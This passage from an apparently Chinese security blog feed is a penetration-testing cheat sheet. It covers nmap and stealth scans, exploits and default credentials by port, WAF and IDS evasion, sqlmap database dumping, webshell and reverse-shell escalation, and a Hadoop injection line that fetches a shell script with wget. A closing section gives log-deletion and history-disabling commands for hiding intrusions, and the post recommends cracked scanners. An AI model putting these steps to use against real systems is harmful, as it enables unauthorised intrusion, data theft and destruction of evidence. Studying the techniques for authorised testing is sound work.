class="line">完整信息获取,详细显示，syn探测，高速扫描，系统和服务版本信息，脚本扫描和路由跟踪,外网扫描T2比较合适，T4以上不准确</span><br><span class="line"></span><br><span class="line">扫描前1000号TCP端口</span><br><span class="line">nmap 192.168.100.2</span><br><span class="line"></span><br><span class="line">Ping扫描8个本地主机(按ARP、ICMP、TCP 80的顺序)</span><br><span class="line">nmap –sP 192.168.100.0 -7</span><br><span class="line"></span><br><span class="line">扫描80,443端口</span><br><span class="line">nmap -p 80,443 192.168.100.2</span><br><span class="line"></span><br><span class="line">扫描前1000号TCP端口，OS指纹，服务，然后运行一个NSE脚本</span><br><span class="line">sudo nmap -A 192.168.100.2</span><br><span class="line"></span><br><span class="line">扫描全部65535个TCP端口，OS指纹，服务，然后运行一个NSE脚本</span><br><span class="line">sudo nmap –A –p- 192.168.100.2</span><br><span class="line"></span><br><span class="line">扫描前1000号UDP端口</span><br><span class="line">sudo nmap -sU 192.168.100.2</span><br><span class="line"></span><br><span class="line">扫描所有65535个UDP端口</span><br><span class="line">sudo nmap -sU –p- 192.168.100.2</span><br><span class="line"></span><br><span class="line">扫描所有65535个UDP端口，并获取服务、OS指纹，之后运行一些NSE脚本</span><br><span class="line">sudo nmap –sU -p- -A 192.168.100.2</span><br></pre></td></tr></table></figure><p><strong>隐蔽扫描</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sN 10.10.10.129</span><br><span class="line">nmap -sN 10.10.10.129</span><br><span class="line">nmap -sF 10.10.10.129</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;<strong>-sN</strong>&#x3D;&#x3D; 是Null扫描，是通过发送非常规的TCP通信数据包进行探测。<strong>Null扫描不会标记任何数据包，目标主机相应端口关闭，会响应一个RST数据包，端口开启则不会响应任何信息；</strong></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814164843843.png" alt="image-20220814164843843"></p><p>21端口开启，所以-sN扫描未返回任何数据包：</p><p>发送的数据包：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814165335013.png" alt="image-20220814165335013"></p><p>&#x3D;&#x3D;<strong>-sF</strong>&#x3D;&#x3D; 是FIN扫描，当我们使用TCP SYN扫描时可能会被目标主机的防火墙发现，会阻止SYN数据包，这时我们使用TCP FIN扫描方式会有很好的穿透效果。使用FIN扫描不需要完成TCP握手，TCP FIN扫描是<strong>向目标端口发送一个FIN包，收到响应RST包则说明目标端口是开放的，如果没有收到RST则说明是关闭的。</strong></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814165013556.png" alt="image-20220814165013556"></p><p>发送的FIN数据包：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814165444175.png" alt="image-20220814165444175"></p><p>邮件服务端口110开启，所以返回RST数据包：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814165151837.png" alt="image-20220814165151837"></p><p>&#x3D;&#x3D;<strong>-sX</strong>&#x3D;&#x3D; 是Xmas扫描，发送的数据包的FIN、PSH和URG标记位置打开，即标志为1。如果目标主机的FIN、PSH和URG标记位是开放的，则会响应一个RST标志包；</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814165213503.png" alt="image-20220814165213503"></p><p>发送的数据包，FIN、PSH和URG标记位为1：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814165601023.png" alt="image-20220814165601023"></p><p>目标主机的FIN、PSH和URG标记位是开放的。所以返回RST数据包，并且可以发现目标主机的FIN、PSH和URG标记位为0：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814164728548.png" alt="image-20220814164728548"></p><h4 id="1-2-常见端口漏洞利用"><a href="#1-2-常见端口漏洞利用" class="headerlink" title="1.2 常见端口漏洞利用"></a>1.2 常见端口漏洞利用</h4><p>快速扫描：<br>Masscan -p80,800 ip –rate&#x3D;10000</p><p><strong>21 &#x2F; FTP</strong></p><blockquote><p>匿名&#x2F;暴力破解<br>拒绝服务</p></blockquote><p><strong>22 &#x2F; SSH</strong></p><blockquote><p>暴力破解</p></blockquote><p><strong>23 &#x2F; telnet</strong></p><blockquote><p>Winbox(CVE-2018-14847)<br><a href="https://github.com/BasuCert/WinboxPoC">https://github.com/BasuCert/WinboxPoC</a><br>弱口令 &#x2F; 暴力破解</p></blockquote><p><strong>161 &#x2F; snmp</strong></p><blockquote><p>弱口令<br><a href="https://blog.csdn.net/archersaber39/article/details/78932252">https://blog.csdn.net/archersaber39/article/details/78932252</a></p></blockquote><p><strong>389 &#x2F; ladp</strong></p><blockquote><p>匿名访问<br><a href="https://www.cnblogs.com/persuit/p/5706432.html">https://www.cnblogs.com/persuit/p/5706432.html</a><br>ladp注入<br><a href="http://www.4hou.com/technology/9090.html">http://www.4hou.com/technology/9090.html</a><br><a href="https://www.freebuf.com/articles/web/149059.html">https://www.freebuf.com/articles/web/149059.html</a></p></blockquote><p><strong>443 &#x2F; ssl</strong></p><blockquote><p>openssl心脏出血<br><a href="https://paper.seebug.org/437/">https://paper.seebug.org/437/</a><br><a href="http://www.anquan.us/static/drops/papers-1381.html">http://www.anquan.us/static/drops/papers-1381.html</a><br><a href="https://www.freebuf.com/sectool/33191.html">https://www.freebuf.com/sectool/33191.html</a></p></blockquote><p><strong>445 &#x2F; smb</strong></p><blockquote><p>win10拒绝服务<br>永恒之蓝RCE</p></blockquote><p><strong>875 &#x2F; rsync</strong></p><blockquote><p>匿名访问<br><a href="http://www.anquan.us/static/bugs/wooyun-2016-0190815.html">http://www.anquan.us/static/bugs/wooyun-2016-0190815.html</a><br><a href="https://paper.seebug.org/409/">https://paper.seebug.org/409/</a><br><a href="http://www.91ri.org/11093.html">http://www.91ri.org/11093.html</a></p></blockquote><p><strong>1433 &#x2F; mssql</strong></p><blockquote><p>暴力破解<br><a href="http://www.anquan.us/static/drops/tips-12749">http://www.anquan.us/static/drops/tips-12749</a>.　　html<br><a href="https://www.seebug.org/appdir/Microsoft%20SQL%20Server">https://www.seebug.org/appdir/Microsoft%20SQL%20Server</a></p><p><strong>1521 &#x2F; oracle</strong></p></blockquote><blockquote><p>暴力破解<br><a href="https://www.exploit-db.com/exploits/33084">https://www.exploit-db.com/exploits/33084</a></p></blockquote><p><strong>2601 &#x2F; zebra</strong></p><blockquote><p><a href="http://www.anquan.us/static/bugs/wooyun-2013-047409.html">http://www.anquan.us/static/bugs/wooyun-2013-047409.html</a></p></blockquote><p><strong>3128 &#x2F; squid</strong></p><p><strong>3306 &#x2F; mysql</strong></p><blockquote><p>RCE<br><a href="http://www.91ri.org/17511.html">http://www.91ri.org/17511.html</a><br>CVE-2015-0411<br>hash破解<br><a href="https://www.freebuf.com/column/153561.html">https://www.freebuf.com/column/153561.html</a><br>waf绕过<br><a href="https://www.freebuf.com/articles/web/155570.html">https://www.freebuf.com/articles/web/155570.html</a><br>general_log_file getshell<br><a href="https://www.freebuf.com/column/143125.html">https://www.freebuf.com/column/143125.html</a><br>提权<br><a href="http://www.91ri.org/16540.html">http://www.91ri.org/16540.html</a></p></blockquote><p><strong>3312 &#x2F; kangle</strong></p><blockquote><p>getshell<br><a href="https://www.secpulse.com/archives/23927.html">https://www.secpulse.com/archives/23927.html</a></p></blockquote><p><strong>3389 &#x2F; rdp</strong></p><blockquote><p>shift 放大镜 输入法绕过 guest用户<br>永恒之蓝(ESTEEMAUDIT)<br><a href="https://www.freebuf.com/articles/system/132171.html">https://www.freebuf.com/articles/system/132171.html</a><br><a href="https://www.anquanke.com/post/id/86328">https://www.anquanke.com/post/id/86328</a><br>ms12-020<br><a href="https://blog.csdn.net/meyo_leo/article/details/77950552">https://blog.csdn.net/meyo_leo/article/details/77950552</a></p></blockquote><p><strong>4440 &#x2F; rundeck</strong></p><blockquote><p><a href="https://www.secpulse.com/archives/29500.html">https://www.secpulse.com/archives/29500.html</a></p></blockquote><p><strong>4848 &#x2F; glassfish</strong></p><blockquote><p>文件读取<br><a href="https://www.secpulse.com/archives/42277.html">https://www.secpulse.com/archives/42277.html</a><br><a href="https://www.anquanke.com/post/id/85948">https://www.anquanke.com/post/id/85948</a><br>GlassFish2 &#x2F; admin:admin GlassFish3,4 &#x2F; 如果管理员不设置帐号本地会自动登录,远程访问会提示配置错误</p></blockquote><p><strong>5432 &#x2F; PostgreSQL</strong></p><blockquote><p>RCE<br><a href="https://www.cnblogs.com/KevinGeorge/p/8521496.html">https://www.cnblogs.com/KevinGeorge/p/8521496.html</a><br><a href="https://www.secpulse.com/archives/69153.html">https://www.secpulse.com/archives/69153.html</a><br>默认账号postgres<br>参考<br><a href="http://www.91ri.org/13070.html">http://www.91ri.org/13070.html</a><br><a href="http://www.91ri.org/6507.html">http://www.91ri.org/6507.html</a></p></blockquote><p><strong>5672,15672,4369,25672 &#x2F; RabbitMQ</strong><br>（guest&#x2F;guest）</p><p><strong>5900 &#x2F; VNC</strong></p><blockquote><p><a href="https://www.seebug.org/appdir/RealVNC">https://www.seebug.org/appdir/RealVNC</a></p></blockquote><p><strong>5984 &#x2F; CouchDB</strong></p><blockquote><p><a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a></p></blockquote><p><strong>6082 &#x2F; varnish</strong></p><blockquote><p>CLI 未授权<br><a href="https://www.secpulse.com/archives/10681.html">https://www.secpulse.com/archives/10681.html</a></p></blockquote><p><strong>6379 &#x2F; redis</strong></p><blockquote><p>Redis未授权<br>ssh publickey<br>crontab<br>webshell<br>反序列化<br>开机自启文件夹写bat<br>参考<br><a href="https://www.freebuf.com/column/170710.html">https://www.freebuf.com/column/170710.html</a></p></blockquote><p><strong>7001,7002 &#x2F; WebLogic</strong></p><blockquote><p>默认弱口令<br>weblogic&#x2F;weblogic ,weblogic&#x2F;welcom ,weblogic&#x2F;welcom1,weblogic1&#x2F;weblogic<br>反序列<br>CVE-2018-2628<br><a href="https://www.freebuf.com/articles/web/169770.html">https://www.freebuf.com/articles/web/169770.html</a><br><a href="https://www.seebug.org/appdir/WebLogic">https://www.seebug.org/appdir/WebLogic</a></p></blockquote><p><strong>9200,9300 &#x2F; elasticsearch</strong></p><blockquote><p>CVE-2015-1427<br><a href="http://www.anquan.us/static/drops/papers-5142.html">http://www.anquan.us/static/drops/papers-5142.html</a><br>CVE-2018-17246<br><a href="https://www.seebug.org/vuldb/ssvid-97730">https://www.seebug.org/vuldb/ssvid-97730</a><br>参考<br><a href="https://www.seebug.org/search/?keywords=elasticsearch">https://www.seebug.org/search/?keywords=elasticsearch</a></p></blockquote><p><strong>9000 &#x2F; fcgi</strong></p><blockquote><p><a href="https://paper.seebug.org/289/">https://paper.seebug.org/289/</a></p></blockquote><p><strong>9043 &#x2F; WebSphere</strong></p><blockquote><p>Websphere8.5<br><a href="https://localhost:9043/ibm/console/logon.jsp">https://localhost:9043/ibm/console/logon.jsp</a><br>Websphere6-7<br><a href="http://localhost:9043/ibm/console">http://localhost:9043/ibm/console</a><br>后台未授权，登录后可部署WAR包<br>SOAP服务有反序列化<br>弱口令：admin &#x2F; password</p></blockquote><p><strong>11211 &#x2F; memcache</strong></p><blockquote><p>未授权<br>UDP反射<br><a href="https://shockerli.net/post/memcached-udp-reflection-attack-bug/">https://shockerli.net/post/memcached-udp-reflection-attack-bug/</a></p></blockquote><p><strong>27017,27018 &#x2F; Mongodb</strong></p><blockquote><p>未授权<br>注入<br><a href="https://www.anquanke.com/post/id/83763">https://www.anquanke.com/post/id/83763</a><br>phpMoAdmin RCE<br><a href="https://www.aqniu.com/threat-alert/6978.html">https://www.aqniu.com/threat-alert/6978.html</a></p></blockquote><p><strong>50000 &#x2F; SAP</strong></p><blockquote><p>SAP命令执行<br><a href="https://www.secpulse.com/archives/20204.html">https://www.secpulse.com/archives/20204.html</a></p></blockquote><p><strong>50070,50030 &#x2F; hadoop</strong></p><blockquote><p>未授权<br><a href="https://www.freebuf.com/vuls/173638.html">https://www.freebuf.com/vuls/173638.html</a><br>命令执行<br>host:50060&#x2F;pstack?pid&#x3D;123|wget <a href="http://somehost/shell.sh">http://somehost/shell.sh</a><br><a href="https://www.seebug.org/search/?keywords=hadoop">https://www.seebug.org/search/?keywords=hadoop</a><br>其他<br><a href="http://www.91ri.org/15441.html">http://www.91ri.org/15441.html</a></p></blockquote><h4 id="1-3-WAF-及-bypass"><a href="#1-3-WAF-及-bypass" class="headerlink" title="1.3 WAF 及 bypass"></a>1.3 WAF 及 bypass</h4><p>探测WAF。</p><p><strong>Nmap</strong>探测WAF有两种脚本，一种是<code>http-waf-detect</code>，一种是<code>http-waf-fingerprint</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p port --script=http-waf-detect ip</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>wafw00f</strong>：kaili中的防火墙探测工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wafw00f -a http://example.com 　　</span><br></pre></td></tr></table></figure><p><strong>sqlmap</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap-u “http://www.vxxxx.org/ex.php?id=1” --identify-waf</span><br></pre></td></tr></table></figure><p>bypass：</p><p>（1）请求真实ip绕过waf：部分watf部署架构的特性，部分waf并不是直接串在目标站点线路上，而是通过DNS解析的形式部署，此时可以先探测到目标站点的真实ip直接请求ip以此绕过waf的检测；</p><p>（2）检测内容范围绕过：waf性能限制，检测特定内容前几k或几十K的内容，然后在此特定内容段内填充物用数据， payload放于物用数据后，以此绕过检测；</p><p>（3）协议盲区绕过：waf根据自己的防御策略所支持的协议特性，针对该协议内的请求进行检查，但是存在一些协议检测或协议运行机制上的缺陷导致被绕过，例如协议未覆盖、协议解析不正确、协议解析遗漏等；</p><p>（4）检测规则绕过：waf工程师规则编写经验、规则覆盖面等问题，来绕过检测，例如利用 MySQL对一些特殊字符处理的特性、语法特性绕过。</p><p>（5）文件包含绕过：相对路径、绝对路径。</p><p>绕过技术：</p><ol><li><p>大小写转换</p></li><li><p>URL编码</p></li><li><p>Unicode</p></li><li><p>HTML编码</p></li><li><p>混合编码</p></li><li><p>使用注释</p></li><li><p>双重编码</p></li><li><p>通配符混淆</p></li><li><p>垃圾字符</p></li><li><p>换行</p></li><li><p>未初始化的变量</p></li><li><p>制表符和换行</p></li><li><p>令牌破坏者</p></li><li><p>其他格式的混淆</p></li></ol><h4 id="1-4-目录、后台和敏感路径文件扫描"><a href="#1-4-目录、后台和敏感路径文件扫描" class="headerlink" title="1.4 目录、后台和敏感路径文件扫描"></a>1.4 目录、后台和敏感路径文件扫描</h4><p><strong>御剑</strong> 目录（土司专版，笔记里有）、后台扫描（图片属性地址暴露），</p><p><strong>完善目录和账密字典方法：</strong></p><p>基础字典包合并去重</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dymerge.py -u</span><br><span class="line">python pydictor.py -tool uniqbiner /my/dict/dirpath --output uniq.txt</span><br><span class="line">python pydictor.py -tool uniqifer /tmp/dicts.txt --output /tmp/uniq.txt</span><br></pre></td></tr></table></figure><p>推荐工具：<strong>白鹿社工字典</strong></p><p><a href="https://github.com/HongLuDianXue/BaiLu-SED-Tool/releases">https://github.com/HongLuDianXue/BaiLu-SED-Tool/releases</a></p><p>密码字典实时丰富更新。提取各种泄露数据中的各种类型的密码，然后按出现频率排序，比如键盘组合top100等等，就能得到各种类型的密码字典。</p><p><a href="https://github.com/huyuanzhi2/password_brute_dictionary">https://github.com/huyuanzhi2/password_brute_dictionary</a></p><h3 id="2-人工浏览-逐个请求burp"><a href="#2-人工浏览-逐个请求burp" class="headerlink" title="2. 人工浏览\逐个请求burp"></a>2. 人工浏览\逐个请求burp</h3><p>非常重要,有必要手动去浏览每个页面，点击页面上每一个跳转，这样在Burp的sitemap里面就可以出现这些请求和响应。</p><p>图片后台地址\图片后面的信息<br>跳转参数\奇怪的参数<br>泄露邮箱等社工信息<br>业务逻辑\架构</p><h3 id="3-自动化"><a href="#3-自动化" class="headerlink" title="3.自动化"></a>3.自动化</h3><p>自动化渗透测试框架:(待补充)</p><p>Sn1per</p><p>Ary</p><p>railgun</p><p>自动化信息收集效率较高，从github上多找一找，也可以自己写：</p><p><a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 oneforall.py --target example.com run</span><br><span class="line">python3 oneforall.py --targets ./example.txt run</span><br></pre></td></tr></table></figure><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h3 id="1-漏洞扫描工具"><a href="#1-漏洞扫描工具" class="headerlink" title="1. 漏洞扫描工具"></a>1. 漏洞扫描工具</h3><p>注意：登录类网站扫描要带cookies扫才能扫到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AWVS网上总有最新破解版</span><br><span class="line"></span><br><span class="line">goby自动化漏扫框架，功能丰富，必备</span><br><span class="line"></span><br><span class="line">Nessus破解流程复杂，但是真的好用</span><br><span class="line"></span><br><span class="line">Netsparker综合型的web应用安全漏洞扫描工具，检查SQL和XSS比较擅长</span><br><span class="line"></span><br><span class="line">Xray也是必备的，渗透开始就挂着，鼠标点到哪里扫到哪里，联动burp和其他漏扫效果也不错</span><br></pre></td></tr></table></figure><h4 id="1-1-Nikto-Web服务漏洞扫描器"><a href="#1-1-Nikto-Web服务漏洞扫描器" class="headerlink" title="1.1 Nikto Web服务漏洞扫描器"></a>1.1 Nikto Web服务漏洞扫描器</h4><p>Tips：利用-Format选项来导出特定格式的扫描结果，使扫描结果更容易阅读和分析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -host http://example.com -output ~/nikto.html -Format html</span><br></pre></td></tr></table></figure><p>NIKTO使用方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1、Nikto -update #升级，更新插件；</span><br><span class="line">2、Nikto -list-plugins #查看插件；</span><br><span class="line">3、Nikto -host http://1.1.1.1 #扫描目标：域名方式；</span><br><span class="line">4、Nikto -host http://1.1.1.1 -output #扫描并输出结果</span><br><span class="line">5、Nikto -host 1.1.1.1 -port 80 #扫描目标：ip地址加端口号</span><br><span class="line">6、Nikto -host http://www.baidu.com -port 443 -ssl #扫描https网站</span><br><span class="line">7、Nikto -host 文件名.txt #批量扫描目标</span><br><span class="line">8、nmap -p80 192.168.1.0/24 -oG - | nikto -host -</span><br><span class="line">#利用nmap扫描开放80端口的IP段并且oG（nmap结果输出并整理）通过管道的方式“|”用nikto进行扫描</span><br><span class="line">9、nikto -host 192.168.0.1 -useproxy http://localhost:8070</span><br><span class="line">#利用代理进行扫描</span><br><span class="line">10、-vhost</span><br><span class="line">#当一个网站存在多个端口时可以使用-vhost 遍历所有网站进行扫描或一个ip对应多个网站</span><br><span class="line">11、Nikto交互形参数</span><br></pre></td></tr></table></figure><p><strong>配置文件</strong>：</p><p>路径：&#x2F;etc&#x2F;nikto.conf<br>User Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本；<br>在nikto中最好修改成别的浏览器user agent；<br>设置cookie：<br>在配置文件中找到cookie进行设置（#STATIC-COOKIE&#x3D; “cookie1”&#x3D;”cookie value”;”cookie2”&#x3D;”cookie val”）</p><p><strong>IDS逃避技术</strong>：</p><p>主要为了躲避IDS、IPS检测告警-evasion #此参数使用方式（Nikto -host <a href="http://1.1.1.1/">http://1.1.1.1</a> -evasion 1234）<br>逃避方式共8种：<br>1、随机url编码，2、自选路径，3、过早结束的URL<br>4、优先考虑长随机字符串5、参数欺骗<br>6、使用TAB作为命令的分隔符，7、使用变化的URL<br>8、使用Windows路径分隔符</p><h4 id="1-2-AWVS漏扫"><a href="#1-2-AWVS漏扫" class="headerlink" title="1.2 AWVS漏扫"></a>1.2 AWVS漏扫</h4><p>这个没什么好说的，破解版到处都是。</p><h4 id="1-3-NESSUS"><a href="#1-3-NESSUS" class="headerlink" title="1.3 NESSUS"></a>1.3 NESSUS</h4><p>实时更新插件的漏扫，很好用，就是激活流程麻烦。<br><a href="https://www.wuyini.cn/765.html">https://www.wuyini.cn/765.html</a></p><h4 id="1-4-Xray自动化的漏洞挖掘"><a href="#1-4-Xray自动化的漏洞挖掘" class="headerlink" title="1.4 Xray自动化的漏洞挖掘"></a>1.4 Xray自动化的漏洞挖掘</h4><p>burp+xray：<br>BurpSuite + Xray 被动扫描配置 - Ritte - 博客园<br>或者直接挂浏览器，点到哪里，扫到哪里<br>xray+各种漏扫联动</p><h4 id="1-5-Fuzz"><a href="#1-5-Fuzz" class="headerlink" title="1.5 Fuzz"></a>1.5 Fuzz</h4><p>Fuzz可以发现应用程序中没有被引用但是确实是可以访问的页面。<br>Discover Content是Burp中专门用于此目的的工具。<br>Burp Intruder也可以通过字典攻击来实施强制浏览(通常是在url参数和文件路径部分进行修改)，爆破、注入等。<br>FuzzDB包含一些用于此目的的非常牛逼的字典。</p><h3 id="2-挖掘漏洞"><a href="#2-挖掘漏洞" class="headerlink" title="2.挖掘漏洞"></a>2.挖掘漏洞</h3><h4 id="2-1-SQL注入"><a href="#2-1-SQL注入" class="headerlink" title="2.1 SQL注入"></a>2.1 SQL注入</h4><p>初步测试：见框就上，加 and 1&#x3D;1、and 1&#x3D;2、and 2&#x3D;1 or </p><p>抓包爆破常用SQL注入payload字典，上burp intruder。</p><p>注入六连：</p><ol><li><p>sqlmap -u “<a href="http://www.xx.com/?id=x&quot;">http://www.xx.com?id=x&quot;</a> 查询是否存在注入点</p></li><li><p>–dbs 检测站点包含哪些数据库</p></li><li><p>–current-db 获取当前的数据库名</p></li><li><p>–tables -D “db_name” 获取指定数据库中的表名 -D后接指定的数据库名称</p></li><li><p>–columns -T “table_name” -D “db_name” 获取数据库表中的字段</p></li><li><p>–dump -C “columns_name” -T “table_name” -D “db_name” 获取字段的数据内容</p></li></ol><ul><li><strong>cookie注入</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.xx.com/xxx.asp&quot; --cookie &quot;id=XXX cookie&quot; --level 2</span><br></pre></td></tr></table></figure><ul><li><p><strong>post注入</strong></p><p>步骤如下：</p><ol><li><p>打开burpsuite获取拦截信息（post），然后右键保存文件（post.txt）到指定目录下。</p></li><li><p>运行sqlmap并执行如下命令加载文件：</p><p><code>sqlmap -r post.txt -p &quot;username&quot;</code></p><p>-p指定参数（即拦截的post请求中表单提交的用户名或密码等name参数）</p><p>自动获取表单：–forms自动获取表单</p><p>例如：<code>sqlmap -u http://www.xx.com/login.asp --forms</code></p><p>指定参数搜索：–data</p><p>例如：<code>sqlmap -u http://www.xx.com/login.asp --data &quot;username=1&quot;</code></p></li></ol></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">--purge  【重新扫描（--purge 删除原先对该目标扫描的记录】</span><br><span class="line">--tables 【获取表名】</span><br><span class="line">--dbs    【检测站点包含哪些数据库】</span><br><span class="line">--current-db   【获取当前的数据库名】</span><br><span class="line">--current-user 【检测当前用户】</span><br><span class="line">--is-dba 【判断站点的当前用户是否为数据库管理员】</span><br><span class="line">--batch  【默认确认，不询问你是否输入】</span><br><span class="line">--search 【后面跟参数 -D -T -C 搜索列（C），表（T）和或数据库名称（D）】</span><br><span class="line">--threads 10 【线程，sqlmap线程最高设置为10】</span><br><span class="line">--level 3   【sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高为5】</span><br><span class="line">--risk 3 【执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全】</span><br><span class="line">-v 【详细的等级(0-6)</span><br><span class="line">0：只显示Python的回溯，错误和关键消息。</span><br><span class="line">1：显示信息和警告消息。</span><br><span class="line">2：显示调试消息。</span><br><span class="line">3：有效载荷注入。</span><br><span class="line">4：显示HTTP请求。</span><br><span class="line">5：显示HTTP响应头。</span><br><span class="line">6：显示HTTP响应页面的内容】</span><br><span class="line"></span><br><span class="line">--privileges 【查看权限】</span><br><span class="line">--tamper xx.py,cc.py 【防火墙绕过，后接tamper库中的py文件】</span><br><span class="line">--method &quot;POST&quot; --data &quot;page=1&amp;id=2&quot; 【POST方式提交数据】</span><br><span class="line">--threads number　　【采用多线程 后接线程数】</span><br><span class="line">--referer &quot;&quot; 【使用referer欺骗】</span><br><span class="line">--user-agent &quot;&quot; 【自定义user-agent】</span><br><span class="line">--proxy “目标地址″ 【使用代理注入】</span><br></pre></td></tr></table></figure><h4 id="2-2-XSS"><a href="#2-2-XSS" class="headerlink" title="2.2 XSS"></a>2.2 XSS</h4><p>xss漏洞原理分析与挖掘方法 - 知乎</p><p>XSS小结 - 先知社区</p><p>2020跨站点脚本[xss]速查表|雨苁</p><p>XSSer自动化工具</p><p>XSStrike 自动化绕过WAF</p><p>XSS生成：<a href="http://xssor.io/">http://xssor.io</a></p><h2 id="漏洞利用getshgell"><a href="#漏洞利用getshgell" class="headerlink" title="漏洞利用getshgell"></a>漏洞利用getshgell</h2><p>常用的漏洞利用工具如下：</p><p>SQL注入 ——&gt; Sqlmap</p><p>XSS跨站脚本——&gt; Beef-XSS</p><p>抓包改包工具——&gt; Burpsuite工具 、 Fidder抓包软件</p><p>文件上传漏洞，上传漏洞的话，我们一般会上传一句话木马上去，进而再获得webshell，传送门——&gt; Webshell和一句话木马</p><p>但是，获得了webshell后，一般权限很低，所以我们需要提权，</p><p>可以选择反弹一个MSF类型的shell提权：Metasploit Framework(MSF)的使用 、 Msfvenonm生成一个后门木马。</p><p>也可以反弹一个CobaltStrike类型的shell：渗透测试神器Cobalt Strike的使用。</p><p>也可以MSF和CobaltStrike联动：MSF和CobaltStrike联动 也可以使用其他提权：Windows提权 、 Linux提权。</p><h2 id="后渗透（权限提升）"><a href="#后渗透（权限提升）" class="headerlink" title="后渗透（权限提升）"></a>后渗透（权限提升）</h2><p>见权限提升的文章</p><h2 id="清除痕迹"><a href="#清除痕迹" class="headerlink" title="清除痕迹"></a>清除痕迹</h2><p>Windows系统</p><p>1：如果是windows系统，可用MSF中的 clearev 命令清除痕迹</p><p>2：如果3389远程登录过，需要清除mstsc痕迹</p><p>3：执行命令清除日志：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del %WINDR%\* .log /a/s/q/f</span><br></pre></td></tr></table></figure><p>4：如果是web应用，找到web日志文件，删除</p><p>Linux系统</p><p>1：如果是Linux系统，在获取权限后，执行以下命令，不会记录输入过的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export HISTFILE=/dev/null export HISTSIZE=0</span><br></pre></td></tr></table></figure><p>2：删除 &#x2F;var&#x2F;log 目录下的日志文件</p><p>3：如果是web应用，找到web日志文件，删除</p><h2 id="撰写报告"><a href="#撰写报告" class="headerlink" title="撰写报告"></a>撰写报告</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;渗透测试全流程&quot;&gt;&lt;a href=&quot;#渗透测试全流程&quot; class=&quot;headerlink&quot; title=&quot;渗透测试全流程&quot;&gt;&lt;/a&gt;渗透测试全流程&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/articl</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>基础概念与信息收集</title>
    <link href="https://frankcao3.github.io/posts/39395"/>
    <id>https://frankcao3.github.io/posts/39395</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-05T11:56:31.794Z</updated>
    
